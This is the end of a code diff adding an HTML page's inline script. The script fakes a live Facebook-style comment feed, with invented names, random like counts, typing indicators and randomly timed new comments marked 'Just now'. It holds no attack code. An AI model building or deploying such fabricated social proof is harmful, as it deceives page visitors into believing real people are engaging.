+        for (let i = 0; i < name.length; i++) h = name.charCodeAt(i) + ((h << 5) - h) + 7;
+        return Math.abs(h) % AVATAR_IMAGES.length;
+    }
+
+    const PHOTO_ICON_SVG = '<svg viewBox="0 0 24 24" width="26" height="26" style="fill:#9AA0A6;"><path d="M21 19V5a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>';
+
+    function buildAvatar(container, name, imgPath, size) {
+        container.innerHTML = '';
+        container.style.width = size + 'px';
+        container.style.height = size + 'px';
+        const fallback = document.createElement('div');
+        fallback.style.cssText = `position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:${Math.round(size * 0.38)}px;background:${colorFor(name)};`;
+        fallback.textContent = initials(name);
+        const img = document.createElement('img');
+        img.style.cssText = 'position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:none;';
+        img.alt = name;
+        img.src = imgPath;
+        img.onload = () => { img.style.display = 'block'; };
+        img.onerror = () => { img.style.display = 'none'; };
+        container.appendChild(fallback);
+        container.appendChild(img);
+    }
+
+    function createAvatarEl(name, size) {
+        const wrap = document.createElement('div');
+        wrap.style.cssText = `position:relative;width:${size}px;height:${size}px;border-radius:50%;flex-shrink:0;overflow:hidden;background:#fff;`;
+        const path = AVATAR_IMAGES[avatarIndexFor(name)];
+        buildAvatar(wrap, name, path, size);
+        return wrap;
+    }
+
+    function createCommentImage(path) {
+        const wrap = document.createElement('div');
+        wrap.className = 'flc-comment-image';
+        wrap.style.cssText = 'margin-top:6px;border-radius:12px;overflow:hidden;max-width:min(260px,100%);border:1px solid #E4E6EB;';
+        const img = document.createElement('img');
+        img.style.cssText = 'display:block;width:100%;max-height:220px;object-fit:cover;';
+        img.alt = 'Comment image';
+        img.loading = 'lazy';
+        img.src = path;
+        img.onload = () => { wrap.style.background = ''; };
+        img.onerror = () => {
+            wrap.style.cssText = 'margin-top:6px;border-radius:12px;overflow:hidden;max-width:min(260px,100%);border:1px solid #E4E6EB;background:#E9EBEE;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;padding:22px 12px;';
+            wrap.innerHTML = PHOTO_ICON_SVG + `<span style="font-size:11px;color:#9AA0A6;text-align:center;word-break:break-all;">${path}</span>`;
+        };
+        wrap.appendChild(img);
+        return wrap;
+    }
+
+    function isNearTop() { return commentsEl.scrollTop < 80; }
+    function scrollToTop() { commentsEl.scrollTop = 0; }
+    function bumpCount() { commentCount++; commentCountEl.textContent = commentCount; }
+
+    function likeBurst(wrapEl) {
+        const heart = document.createElement('span');
+        heart.style.cssText = 'position:absolute;left:2px;top:-4px;pointer-events:none;font-size:14px;animation:flcHeartUp .7s ease forwards;';
+        heart.textContent = '❤️';
+        wrapEl.appendChild(heart);
+        setTimeout(() => heart.remove(), 700);
+    }
+
+    function makeActions(isReply, likeSeed) {
+        const wrap = document.createElement('div');
+        wrap.className = 'flc-actions';
+        wrap.style.cssText = 'display:inline-flex;flex-wrap:nowrap;white-space:nowrap;gap:8px;align-items:center;margin:0 2px 0 10px;font-size:12.5px;color:#65676B;max-width:100%;';
+        let liked = false;
+        let count = likeSeed;
+
+        const likeWrap = document.createElement('span');
+        likeWrap.style.cssText = 'position:relative;display:inline-flex;';
+        const likeBtn = document.createElement('button');
+        likeBtn.type = 'button';
+        likeBtn.textContent = 'Like';
+        likeBtn.style.cssText = 'background:none;border:none;padding:4px 2px;margin:-4px -2px;font-size:12.5px;font-weight:600;color:#65676B;cursor:pointer;font-family:inherit;';
+        likeWrap.appendChild(likeBtn);
+        const countSpan = document.createElement('span');
+        countSpan.style.cssText = 'font-weight:400;color:#65676B;';
+        const replyBtn = document.createElement('button');
+        replyBtn.type = 'button';
+        replyBtn.textContent = 'Reply';
+        replyBtn.style.cssText = 'background:none;border:none;padding:4px 2px;margin:-4px -2px;font-size:12.5px;font-weight:600;color:#65676B;cursor:pointer;font-family:inherit;';
+        const dotStyle = 'opacity:.6;';
+        const dot1 = document.createElement('span'); dot1.style.cssText = dotStyle; dot1.textContent = '·';
+        const time = document.createElement('span');
+        time.textContent = 'Just now';
+
+        likeBtn.addEventListener('click', () => {
+            liked = !liked;
+            count += liked ? 1 : -1;
+            likeBtn.style.color = liked ? '#F33E58' : '#65676B';
+            countSpan.textContent = count > 0 ? count : '';
+            if (liked) likeBurst(likeWrap);
+        });
+
+        wrap.appendChild(likeWrap);
+        wrap.appendChild(countSpan);
+        if (!isReply) {
+            wrap.appendChild(dot1);
+            wrap.appendChild(replyBtn);
+        }
+        const dot2 = document.createElement('span'); dot2.style.cssText = dotStyle; dot2.textContent = '·';
+        wrap.appendChild(dot2);
+        wrap.appendChild(time);
+
+        return { wrap, replyBtn };
+    }
+
+    function createCommentRow(name, text, isReply, imagePathOrDataUrl, isDataUrl) {
+        const row = document.createElement('div');
+        row.className = isReply ? 'flc-comment-row flc-reply-row' : 'flc-comment-row';
+        row.style.cssText = `display:flex;gap:8px;margin:10px 0;animation:flcPop .32s cubic-bezier(.2,.9,.3,1.3);`;
+
+        const avatar = createAvatarEl(name, isReply ? 28 : 34);
+
+        const col = document.createElement('div');
+        col.className = 'flc-bubble-col';
+        col.style.cssText = 'flex:1;min-width:0;';
+
+        const bubble = document.createElement('div');
+        bubble.style.cssText = 'background:#F0F2F5;border-radius:16px;padding:8px 12px 6px;display:inline-block;max-width:100%;box-sizing:border-box;';
+        const nameEl = document.createElement('span');
+        nameEl.style.cssText = 'font-weight:600;font-size:13.5px;display:block;margin-bottom:1px;';
+        nameEl.textContent = name;
+        const textEl = document.createElement('span');
+        textEl.style.cssText = 'font-size:14.5px;line-height:1.35;color:#050505;word-wrap:break-word;overflow-wrap:anywhere;';
+        textEl.textContent = text;
+        bubble.appendChild(nameEl);
+        bubble.appendChild(textEl);
+
+        const likeSeed = isReply ? Math.floor(Math.random() * 6) : Math.floor(Math.random() * 30);
+        const { wrap: actions, replyBtn } = makeActions(isReply, likeSeed);
+
+        col.appendChild(bubble);
+
+        if (imagePathOrDataUrl) {
+            const imgEl = isDataUrl
+                ? createCommentImageFromDataUrl(imagePathOrDataUrl)
+                : createCommentImage(imagePathOrDataUrl);
+            col.appendChild(imgEl);
+        }
+
+        col.appendChild(actions);
+
+        let repliesEl = null;
+        let replyComposerShown = false;
+
+        if (!isReply) {
+            repliesEl = document.createElement('div');
+            repliesEl.className = 'flc-replies';
+            repliesEl.style.cssText = 'margin-left:clamp(8px,4vw,16px);padding-left:clamp(6px,3vw,14px);border-left:2px solid #E4E6EB;margin-top:6px;display:none;';
+            col.appendChild(repliesEl);
+
+            replyBtn.addEventListener('click', () => {
+                if (replyComposerShown) {
+                    const existing = col.querySelector('.flc-reply-composer');
+                    if (existing) existing.remove();
+                    replyComposerShown = false;
+                    return;
+                }
+                replyComposerShown = true;
+                repliesEl.style.display = 'block';
+                const rc = document.createElement('div');
+                rc.className = 'flc-reply-composer';
+                rc.style.cssText = 'margin:6px 0 0 12px;display:flex;gap:8px;';
+                const input = document.createElement('input');
+                input.type = 'text';
+                input.placeholder = `Reply to ${name}…`;
+                input.maxLength = 150;
+                input.style.cssText = 'flex:1;min-width:0;border:none;background:#F0F2F5;border-radius:16px;padding:6px 12px;font-size:16px;font-family:inherit;outline:none;box-sizing:border-box;';
+                const send = document.createElement('button');
+                send.type = 'button';
+                send.textContent = 'Post';
+                send.style.cssText = 'border:none;background:none;color:#1B74E4;font-weight:700;font-size:13px;cursor:pointer;font-family:inherit;padding:4px 6px;';
+                rc.appendChild(input);
+                rc.appendChild(send);
+                col.insertBefore(rc, repliesEl);
+                input.focus();
+
+                function submitReply() {
+                    const val = input.value.trim();
+                    if (!val) return;
+                    const r = createCommentRow('You', val, true);
+                    repliesEl.appendChild(r.row);
+                    repliesEl.style.display = 'block';
+                    bumpCount();
+                    rc.remove();
+                    replyComposerShown = false;
+                }
+                send.addEventListener('click', submitReply);
+                input.addEventListener('keydown', e => { if (e.key === 'Enter') submitReply(); });
+            });
+        }
+
+        row.appendChild(avatar);
+        row.appendChild(col);
+
+        return { row, repliesEl };
+    }
+
+    function maybeCommentImagePath() { return Math.random() < 0.28 ? pick(COMMENT_IMAGE_SLOTS) : null; }
+
+    function appendTopLevel(name, text, imagePath) {
+        const { row, repliesEl } = createCommentRow(name, text, false, imagePath, false);
+        commentsEl.prepend(row);
+        bumpCount();
+        const id = commentStore.length ? Math.max(...commentStore.map(c => c.id)) + 1 : 1;
+        commentStore.unshift({ id, repliesEl });
+        if (commentStore.length > 40) commentStore.pop();
+        if (isNearTop()) scrollToTop();
+        return id;
+    }
+
+    function appendReply(repliesEl, name, text, imagePath, isDataUrl) {
+        repliesEl.style.display = 'block';
+        const { row } = createCommentRow(name, text, true, imagePath, isDataUrl);
+        repliesEl.appendChild(row);
+        bumpCount();
+        if (isNearTop()) scrollToTop();
+    }
+
+    function showTyping(name) {
+        const row = document.createElement('div');
+        row.style.cssText = 'display:flex;gap:8px;margin:10px 0;align-items:flex-end;animation:flcPop .25s ease;';
+        const avatar = createAvatarEl(name, 34);
+        const bubble = document.createElement('div');
+        bubble.style.cssText = 'background:#F0F2F5;border-radius:16px;padding:10px 14px;display:inline-flex;align-items:center;gap:4px;';
+        [0, 1, 2].forEach((i) => {
+            const dot = document.createElement('span');
+            dot.style.cssText = `width:6px;height:6px;border-radius:50%;background:#8A8D91;animation:flcBounce 1.1s infinite ease-in-out;animation-delay:${i * 0.15}s;display:inline-block;`;
+            bubble.appendChild(dot);
+        });
+        row.appendChild(avatar);
+        row.appendChild(bubble);
+        commentsEl.prepend(row);
+        if (isNearTop()) scrollToTop();
+        typingStatusEl.textContent = `${name} is typing…`;
+        return row;
+    }
+
+    function hideTyping(row) {
+        row.remove();
+        typingStatusEl.textContent = '';
+    }
+
+    function seedInitialComments() {
+        const seed = [
+            ["Chidinma Okafor", pick(TOP_COMMENTS), [["Emeka Obi", pick(REPLIES)]]],
+            ["Ibrahim Musa", pick(TOP_COMMENTS), []],
+            ["Ngozi Eze", pick(TOP_COMMENTS), [["Aisha Bello", pick(REPLIES)], ["Segun Ogunleye", pick(REPLIES)]]],
+        ];
+        seed.slice().reverse().forEach(([name, text, replies]) => {
+            const id = appendTopLevel(name, text, maybeCommentImagePath());
+            const entry = commentStore.find(c => c.id === id);
+            if (entry) replies.forEach(([rn, rt]) => appendReply(entry.repliesEl, rn, rt));
+        });
+        scrollToTop();
+    }
+
+    function simulateOne() {
+        const asReply = commentStore.length > 0 && Math.random() < 0.35;
+        const name = pick(NAMES);
+
+        const typingRow = showTyping(name);
+        const delay = 900 + Math.random() * 1400;
+
+        setTimeout(() => {
+            hideTyping(typingRow);
+
+            if (asReply) {
+                const topThree = commentStore.slice(0, Math.min(3, commentStore.length));
+                const target = pick(topThree);
+                appendReply(target.repliesEl, name, pick(REPLIES));
+            } else {
+                const text = pick(TOP_COMMENTS);
+                const id = appendTopLevel(name, text, maybeCommentImagePath());
+                const entry = commentStore.find(c => c.id === id);
+                if (entry && Math.random() < 0.45) {
+                    // optional chain replies
+                }
+            }
+        }, delay);
+    }
+
+    seedInitialComments();
+    setTimeout(simulateOne, 2000);
+    setInterval(() => {
+        if (Math.random() < 0.3) simulateOne();
+    }, 4000);
+</script>
+
+</body>
+</html>
